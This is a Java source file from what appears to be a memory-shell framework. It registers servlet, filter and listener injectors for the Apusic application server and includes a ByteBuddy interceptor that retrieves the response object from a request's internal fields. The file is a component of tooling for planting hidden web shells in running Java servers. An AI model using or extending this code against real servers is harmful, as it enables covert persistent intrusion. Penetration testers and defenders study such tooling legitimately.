package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.injector.apusic.ApusicFilterInjector;
import com.reajason.javaweb.memshell.injector.apusic.ApusicListenerInjector;
import com.reajason.javaweb.memshell.injector.apusic.ApusicServletInjector;
import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.implementation.bytecode.assign.Assigner;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/27
 */
public class ApusicShell extends AbstractShell {

    public static class ListenerInterceptor {
        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false, typing = Assigner.Typing.DYNAMIC) Object response) throws Exception {
            response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "parameters"), "response");
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(SERVLET, ApusicServletInjector.class)
                .addInjector(FILTER, ApusicFilterInjector.class)
                .addInjector(LISTENER, ApusicListenerInjector.class).build();
    }
}
